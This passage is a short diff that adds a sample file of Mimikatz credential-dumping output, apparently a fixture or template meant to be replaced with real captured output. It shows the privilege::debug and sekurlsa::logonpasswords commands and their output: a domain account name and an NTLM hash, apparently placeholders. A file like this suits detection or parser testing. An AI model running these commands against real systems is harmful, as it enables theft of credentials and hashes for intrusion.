@@ -1,0 +1,15 @@
+# Sample Mimikatz credential-dumping session output
+# Replace with your actual captured output.
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+Authentication Id : 0 ; 123456
+Session           : Interactive from 1
+User Name         : john.doe
+Domain            : CORP
+        msv :
+         [00000003] Primary
+         * Username : john.doe
+         * NTLM     : e19ccf75ee54e06b06a5907af13cef42
